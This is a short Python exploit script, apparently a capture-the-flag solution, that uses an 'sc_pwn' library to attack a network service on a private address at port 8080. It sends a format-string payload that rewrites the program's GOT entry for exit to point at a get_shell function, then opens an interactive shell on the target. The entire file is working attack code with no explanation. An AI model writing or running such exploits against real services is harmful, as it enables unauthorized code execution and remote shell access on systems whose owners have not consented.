#!/usr/bin/env python
from sc_pwn import *

target     = {'host':'192.168.75.139','port':8080}

addr_got_exit   = 0x0804a020
addr_get_shell  = 0x080485b5

#==========
def attack(cmn):
    fsb = FSB(size=2)
    fsb.set_adrval(addr_got_exit, addr_get_shell)
    fsb.auto_write(index=7)

    cmn.read_until('message >> ')
    cmn.sendln(fsb.get())

#==========

if __name__=='__main__':
    cmn = Communicate(target,mode='SOCKET')
    attack(cmn)
    
    sh = Shell(cmn)
    sh.select()
    del(sh)
    
    del(cmn)
    
#==========
